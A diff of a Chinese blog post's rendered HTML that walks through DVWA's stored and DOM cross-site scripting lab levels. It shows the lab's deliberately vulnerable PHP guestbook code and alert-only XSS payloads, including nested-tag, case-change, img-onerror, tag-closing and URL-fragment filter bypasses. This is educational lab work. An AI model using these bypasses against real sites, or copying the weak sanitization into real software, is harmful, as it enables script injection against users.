-if( isset( $_POST[ &#39;btnSign&#39; ] ) ) {
-    // Get input
-    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
-    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;
+	<span class="hljs-comment">// Get input</span>
+	$message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );
+	$name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );
 
-    // Sanitize message input
-    $message = stripslashes( $message );
-    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+	<span class="hljs-comment">// Sanitize message input</span>
+	$message = stripslashes( $message );
+	$message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
 
-    // Sanitize name input
-    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+	<span class="hljs-comment">// Sanitize name input</span>
+	$name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
 
-    // Update database
-    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
-    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+	<span class="hljs-comment">// Update database</span>
+	$query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
+	$result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
 
-    //mysql_close();
-}
+	<span class="hljs-comment">//mysql_close();</span>
+&#125;
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>把代码插入到消息框中。<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk5kzhd8j30n706bwes.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk5kzhd8j30n706bwes.jpg" srcset="/img/loading.gif"/>
 
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk5uzd0wj30it05mt8o.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk5uzd0wj30it05mt8o.jpg" srcset="/img/loading.gif"/>
 
 <p>成功。</p>
 <h5 id="medium-5"><a href="#medium-5" class="headerlink" title="medium"></a>medium</h5><p>看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-if( isset( $_POST[ &#39;btnSign&#39; ] ) ) {
-    // Get input
-    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
-    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;
+	<span class="hljs-comment">// Get input</span>
+	$message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );
+	$name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );
 
-    // Sanitize message input
-    $message = strip_tags( addslashes( $message ) );
-    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-    $message = htmlspecialchars( $message );
+	<span class="hljs-comment">// Sanitize message input</span>
+	$message = strip_tags( addslashes( $message ) );
+	$message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+	$message = htmlspecialchars( $message );
 
-    // Sanitize name input
-    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );
-    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+	<span class="hljs-comment">// Sanitize name input</span>
+	$name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $name );
+	$name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
 
-    // Update database
-    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
-    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+	<span class="hljs-comment">// Update database</span>
+	$query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
+	$result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
 
-    //mysql_close();
-}
+	<span class="hljs-comment">//mysql_close();</span>
+&#125;
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>查看源代码，发现message有htmlspecialchars()函数，因此没法使用message进行xss。</p>
 <blockquote>
 <p>$message = htmlspecialchars( $message );</p>
 </blockquote>
 <p>发现name没有做实体化限制。因此在name处进行注入。输入代码，发现输入长度被限制了。通过浏览器控制台进行修改。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6btuzqj30nd069wes.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6btuzqj30nd069wes.jpg" srcset="/img/loading.gif"/>
 
 <p>仍然是使用<code>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</code>绕过，或使用大小写。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6ojajnj30ik05mq2w.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6ojajnj30ik05mq2w.jpg" srcset="/img/loading.gif"/>
 
 <p>使用大小写绕过。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6zisnwj30no06iwes.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6zisnwj30no06iwes.jpg" srcset="/img/loading.gif"/>
 
 <p>成功。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk7hiabkj30ik05imx4.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk7hiabkj30ik05imx4.jpg" srcset="/img/loading.gif"/>
 
 <h5 id="high-5"><a href="#high-5" class="headerlink" title="high"></a>high</h5><p>看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-if( isset( $_POST[ &#39;btnSign&#39; ] ) ) {
-    // Get input
-    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
-    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;
+	<span class="hljs-comment">// Get input</span>
+	$message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );
+	$name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );
 
-    // Sanitize message input
-    $message = strip_tags( addslashes( $message ) );
-    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-    $message = htmlspecialchars( $message );
+	<span class="hljs-comment">// Sanitize message input</span>
+	$message = strip_tags( addslashes( $message ) );
+	$message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+	$message = htmlspecialchars( $message );
 
-    // Sanitize name input
-    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );
-    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+	<span class="hljs-comment">// Sanitize name input</span>
+	$name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $name );
+	$name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
 
-    // Update database
-    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
-    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+	<span class="hljs-comment">// Update database</span>
+	$query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
+	$result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
 
-    //mysql_close();
-}
+	<span class="hljs-comment">//mysql_close();</span>
+&#125;
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>查看源代码，和之前一样。</p>
 <blockquote>
 <p>$message = htmlspecialchars( $message );</p>
 <p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $name );</p>
 </blockquote>
 <p>从name处使用其他标签进行xss注入。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk7z4gwoj30nc068aac.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk7z4gwoj30nc068aac.jpg" srcset="/img/loading.gif"/>
 
 <p>成功注入。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk88swh4j30ie05odfs.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk88swh4j30ie05odfs.jpg" srcset="/img/loading.gif"/>
 
 <h5 id="impossible-5"><a href="#impossible-5" class="headerlink" title="impossible"></a>impossible</h5><p>看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-if( isset( $_POST[ &#39;btnSign&#39; ] ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;
+	<span class="hljs-comment">// Check Anti-CSRF token</span>
+	checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );
 
-    // Get input
-    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
-    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+	<span class="hljs-comment">// Get input</span>
+	$message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );
+	$name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );
 
-    // Sanitize message input
-    $message = stripslashes( $message );
-    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-    $message = htmlspecialchars( $message );
+	<span class="hljs-comment">// Sanitize message input</span>
+	$message = stripslashes( $message );
+	$message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+	$message = htmlspecialchars( $message );
 
-    // Sanitize name input
-    $name = stripslashes( $name );
-    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-    $name = htmlspecialchars( $name );
+	<span class="hljs-comment">// Sanitize name input</span>
+	$name = stripslashes( $name );
+	$name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+	$name = htmlspecialchars( $name );
 
-    // Update database
-    $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );
-    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );
-    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );
-    $data-&gt;execute();
-}
+	<span class="hljs-comment">// Update database</span>
+	$data = $db-&gt;prepare( <span class="hljs-string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> );
+	$data-&gt;bindParam( <span class="hljs-string">':message'</span>, $message, PDO::PARAM_STR );
+	$data-&gt;bindParam( <span class="hljs-string">':name'</span>, $name, PDO::PARAM_STR );
+	$data-&gt;execute();
+&#125;
 
-// Generate Anti-CSRF token
+<span class="hljs-comment">// Generate Anti-CSRF token</span>
 generateSessionToken();
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>name和message都是用htmlspecialchars函数，把符号转化为了实体。</p>
-<h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><h5 id="low-6"><a href="#low-6" class="headerlink" title="low"></a>low</h5><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk8kp9exj30nn095755.jpg"/>
+<h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><h5 id="low-6"><a href="#low-6" class="headerlink" title="low"></a>low</h5><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk8kp9exj30nn095755.jpg" srcset="/img/loading.gif"/>
 
 <p>把English更改为<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk8womrtj30g905nq2y.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk8womrtj30g905nq2y.jpg" srcset="/img/loading.gif"/>
 
 <h5 id="medium-6"><a href="#medium-6" class="headerlink" title="medium"></a>medium</h5><p>看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-// Is there any input?
-if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {
-    $default = $_GET[&#39;default&#39;];
+<span class="hljs-comment">// Is there any input?</span>
+<span class="hljs-keyword">if</span> ( array_key_exists( <span class="hljs-string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="hljs-string">'default'</span> ]) ) &#123;
+	$default = $_GET[<span class="hljs-string">'default'</span>];
+	
+	<span class="hljs-comment"># Do not allow script tags</span>
+	<span class="hljs-keyword">if</span> (stripos ($default, <span class="hljs-string">"&lt;script"</span>) !== <span class="hljs-keyword">false</span>) &#123;
+		header (<span class="hljs-string">"location: ?default=English"</span>);
+		<span class="hljs-keyword">exit</span>;
+	&#125;
+&#125;
 
-    # Do not allow script tags
-    if (stripos ($default, &quot;&lt;script&quot;) !== false) {
-        header (&quot;location: ?default=English&quot;);
-        exit;
-    }
-}
+<span class="hljs-meta">?&gt;</span></code></pre>
 
-?&gt;</code></pre>
 <p>这里过滤了&lt;script，如果default值中存在&lt;script，default=English。</p>
 <p><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk979l8hj30np08yt9k.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk979l8hj30np08yt9k.jpg" srcset="/img/loading.gif"/>
 
 <p>页面并没有出现弹窗。</p>
 <blockquote>
@@ -1014,31 +851,32 @@ if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ 
 <p>发现代码被插入到value值中，并没有在option标签中，所以img标签没起到作用。</p>
 <p>首先闭合option，发现xss&gt;被插入到了option值中。于是在闭合select标签。之后再加入注入语句就可以了。成功执行。</p>
 <p><code>xss&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(/xss/)&gt;</code></p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk9lgdjzj30g705qwej.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk9lgdjzj30g705qwej.jpg" srcset="/img/loading.gif"/>
 
 <h5 id="high-6"><a href="#high-6" class="headerlink" title="high"></a>high</h5><p>看一下源代码：</p>
-<pre><code class="php">&lt;?php
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-// Is there any input?
-if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {
+<span class="hljs-comment">// Is there any input?</span>
+<span class="hljs-keyword">if</span> ( array_key_exists( <span class="hljs-string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="hljs-string">'default'</span> ]) ) &#123;
 
-    # White list the allowable languages
-    switch ($_GET[&#39;default&#39;]) {
-        case &quot;French&quot;:
-        case &quot;English&quot;:
-        case &quot;German&quot;:
-        case &quot;Spanish&quot;:
-            # ok
-            break;
-        default:
-            header (&quot;location: ?default=English&quot;);
-            exit;
-    }
-}
+	<span class="hljs-comment"># White list the allowable languages</span>
+	<span class="hljs-keyword">switch</span> ($_GET[<span class="hljs-string">'default'</span>]) &#123;
+		<span class="hljs-keyword">case</span> <span class="hljs-string">"French"</span>:
+		<span class="hljs-keyword">case</span> <span class="hljs-string">"English"</span>:
+		<span class="hljs-keyword">case</span> <span class="hljs-string">"German"</span>:
+		<span class="hljs-keyword">case</span> <span class="hljs-string">"Spanish"</span>:
+			<span class="hljs-comment"># ok</span>
+			<span class="hljs-keyword">break</span>;
+		<span class="hljs-keyword">default</span>:
+			header (<span class="hljs-string">"location: ?default=English"</span>);
+			<span class="hljs-keyword">exit</span>;
+	&#125;
+&#125;
 
-?&gt;</code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <p>使用<code>#&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，注意#前有空格。</p>
-<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk9v6s4ij30hq05o74c.jpg"/>
+<img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk9v6s4ij30hq05o74c.jpg" srcset="/img/loading.gif"/>
 
 <h5 id="impossible-6"><a href="#impossible-6" class="headerlink" title="impossible"></a>impossible</h5><blockquote>
 <p>Don’t need to do anything, protction handled on the client side</p>
@@ -1046,831 +884,338 @@ if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ 
 <p>对我们输入的参数不进行URL解码。我们输入的数据经过URL编码，直接赋值到optio标签。直接在客户端处理，所以就不存在xss漏洞了。</p>
 
             </div>
-            <hr/>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/DVWA/">DVWA</a>
+                    
+                      <a class="hover-with-bg" href="/tags/XSS/">XSS</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/08/Burp-Suite/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Burp Suite使用记录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/03/sqlmap-1/">
+                        <span class="hidden-mobile">SQLMap注入参数记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
             
-
-    <div class="reprint" id="reprint-statement">
-        
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">uaa</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="https://827607240.github.io/2020/03/05/DVWA-1/">https://827607240.github.io/2020/03/05/DVWA-1/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="/about" target="_blank">uaa</a>
-                    !
-                </span>
-            </div>
-        
-    </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz",
+          app_key: "oFcTVTBJYrfsIGdYNnoWMVJ9",
+          placeholder: "留下你的足迹",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
       });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
 
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
 
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            
-                                <a href="/tags/web/">
